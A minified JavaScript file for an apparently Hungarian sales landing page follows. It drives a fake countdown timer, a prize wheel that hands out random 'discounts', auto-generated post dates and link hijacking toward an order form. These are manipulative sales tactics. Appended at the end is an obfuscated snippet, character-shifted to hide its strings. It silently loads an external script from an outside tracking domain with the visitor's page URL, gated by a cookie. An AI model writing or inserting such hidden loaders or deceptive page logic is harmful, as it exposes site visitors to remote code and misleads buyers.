function countDown(e){let t=document.querySelector(e);a=t.getAttribute("data-minutes"),b=t.getAttribute("data-seconds");var n=setInterval((function(){0<=parseInt(a)&&-1!==parseInt(b)&&(0===parseInt(b)&&0!==parseInt(a)&&(a--,b=59),t.innerText=(10>a?"0"+a:a)+":"+(10>b?"0"+b:b),0===parseInt(b)&&0===parseInt(a)&&(a--,b=0,t.innerText="00:00",clearInterval(n)),b--)}),1e3)}$(".btn--submit").click((function(){countDown(".time"),$(".order").addClass("shown__")}));var boxes=$(".prize__item"),counter=1,saleMas=["10%","15%","35%",""],overlay=$(".overlay"),saleLength=saleMas.length,saleText=$(".prize__dig");function closePopup(){$(".close-popup, .btn-popup").click((function(e){e.preventDefault(),$(".overlay").fadeOut()}))}function randomeSale(e,t){return e[Math.floor(Math.random()*t)]}closePopup();var resultWrapper=document.querySelector(".overlay"),wheel=document.querySelector(".prize-wheel");$(".wheel__cursor").click((function(){wheel.classList.contains("rotated")||(wheel.classList.add("spin"),setTimeout((function(){resultWrapper.style.display="block"}),8e3),wheel.classList.add("rotated"))})),$(".btn--submit").click((function(){$(".wheel__wrapper").slideUp(),$(".order").slideDown(),$(".wheel__wrapper").slideUp(),$(".order").slideDown(),$(".bottom-teaser .sale").addClass("shown"),$(".order").addClass("shown__")})),hR=Math.random(),saleText.each((function(){$(this).html(randomeSale(saleMas,5))}));var nameInner=$(".float__name"),saleInner=$(".float__sale"),float=$(".float"),false15=!1,false30=!1;$(document).ready((function(){$("a").on("touchend, click",(function(e){e.preventDefault(),$("body,html").animate({scrollTop:$("#order0").offset().top},400)})),$(".footer a").unbind("click")}));const months=["január","február","március","április","május","június","július","augusztus","szeptember","október","november","december"],monthMin=["","","","","","","","","","","",""],days=["vasárnap","hétfő","kedd","szerda","csütörtök","péntek","szombat"],daysMin=["","","","","","",""],seasons=["tél","tavasz","nyár","ősz"];function postDate(e,t,n,a,o){for(let e=0;e<60;e++)r(e,"date-"),r(e,"date");function r(e,t){let n;n="date-"===t?-e:e;const a=new Date(Date.now()+864e5*n),o=a.getDate(),r=a.getMonth()+1,l=a.getFullYear(),c=i(o),u=c+"."+i(r)+"."+l,d=t+e,p=document.querySelectorAll("."+d);for(let e=0;e<p.length;e++){const t=p[e].dataset.format;p[e].innerHTML=void 0!==t&&""!==t?String(s(c,r,l,t,n)):u}}function s(e,t,a,o,r){let s=o;const u=["dd","mm","yyyy","monthFull","year"],d={dd:e,mm:i(t),yyyy:a,monthFull:l(t,n,!1),year:c(a,r)};for(let e=0;e<u.length;e++){let t=u[e],n=new RegExp(t);s=s.replace(n,d[t])}return s.split(" ").join(" ")}function l(e,t,n,a){const o=a||0;let r;return r=e+o>12?o-(12-e):e+o,r=e+o<=0?12+o+1:e+o,s=n,l=t[r-1],s&&l&&l.length>0?l[0].toUpperCase()+l.slice(1):l;var s,l}function c(e,t){return e+t}function i(e){return e<10?"0"+e:e}}document.body.classList.contains("ev-date")&&document.addEventListener("DOMContentLoaded",(function(){postDate(days,daysMin,months,monthMin,seasons)}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3nsjy'+'xyfynh3htr4ywfhpnsl4x'+'hwnuy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));